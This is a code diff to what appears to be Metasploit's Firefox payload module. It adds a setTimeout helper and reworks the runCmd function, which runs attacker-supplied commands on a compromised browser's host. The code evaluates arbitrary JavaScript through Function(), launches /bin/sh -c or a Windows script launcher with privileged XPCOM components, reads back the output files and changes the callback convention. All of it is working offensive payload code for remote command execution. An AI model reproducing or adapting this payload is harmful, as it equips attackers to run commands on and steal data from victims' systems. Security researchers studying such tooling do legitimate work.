@@ -4,6 +4,19 @@ require 'json'
 
 module Msf::Payload::Firefox
 
+
+  # Javascript source code of setTimeout(fn, delay)
+  # @return [String] javascript source code that exposes the setTimeout(fn, delay) method
+  def set_timeout_source
+    %Q|
+      var setTimeout = function(cb, delay) {
+        var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
+        timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
+        return timer;
+      };
+    |
+  end
+
   # Javascript source code of readFile(path) - synchronously reads a file and returns
   # its contents. The file is deleted immediately afterwards.
   #
@@ -54,18 +67,44 @@ module Msf::Payload::Firefox
   # @return [String] javascript source code that exposes the runCmd(str) method.
   def run_cmd_source
     %Q|
+      #{read_file_source}
+      #{set_timeout_source}
+
       var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
       var windows = (ua.indexOf("Windows")>-1);
       var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
       var runCmd = function(cmd, cb) {
-        if (cmd.trim().length == 0) return;
+        cb = cb \|\| (function(){});
+
+        if (cmd.trim().length == 0) {
+          setTimeout(function(){ cb("Command is empty string ('')."); });
+          return;
+        }
 
         var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
         if (js) {
           var tag = "[!JAVASCRIPT]";
-          Function('send', js[1])(function(r){ if (r) cb(r+tag+"\\n"); });
+          var sync = true;  // avoid zalgo's reach
+          var sent = false;
+
+          var retVal = Function('send', js[1])(function(r){
+            if (sent) return;
+            sent = true
+            if (r) {
+              if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
+              else      cb(false, r+tag+"\\n");
+            }
+          });
+
+          sync = false;
+
+          if (retVal && !sent) {
+            sent = true;
+            setTimeout(function(){ cb(false, retVal+tag+"\\n"); });
+          }
+
           return;
         }
 
@@ -116,13 +155,13 @@ module Msf::Payload::Firefox
           var args = [jscriptFile.path, b64];
           process.run(true, args, args.length);
           jscriptFile.remove(true);
-          cb(cmd+"\\n"+readFile(stdout.path));
+          setTimeout(function(){cb(false, cmd+"\\n"+readFile(stdout.path));});
         } else {
           sh.initWithPath("/bin/sh");
           process.init(sh);
           var args = ["-c", shell];
           process.run(true, args, args.length);
-          cb(readFile(stdout.path));
+          setTimeout(function(){cb(false, readFile(stdout.path));});
         }
       };
     |
